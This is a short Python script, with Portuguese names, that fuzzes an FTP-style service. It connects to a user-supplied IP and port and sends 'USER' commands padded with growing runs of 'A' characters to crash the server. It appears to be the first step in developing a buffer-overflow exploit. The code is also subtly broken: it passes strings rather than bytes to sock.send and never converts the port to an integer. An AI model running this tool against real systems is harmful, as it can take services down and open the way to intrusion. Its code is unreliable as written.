import socket
import time


def gerar_buffer():
    buffer = ['A']
    crescimento = 100
    while len(buffer) <= 10:
        buffer.append('A' * crescimento)
        crescimento += 50
    return buffer


def crachar(ip_alvo, porta_alvo):
    buffer = gerar_buffer()

    for item in buffer:
        print(f"Fuzzing {len(item)} bytes")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip_alvo, porta_alvo))

        sock.recv(1024)
        sock.send("USER " + item + "\r\n")
        time.sleep(1)

        sock.recv(1024)
        sock.send("PASS senha\r\n")
        time.sleep(1)

        sock.send("QUIT\r\n")
        sock.close()


if __name__ == '__main__':
    ip = input("Entre com o IP: ")
    porta = input("Entre com a porta: ")

    crachar(ip, porta)
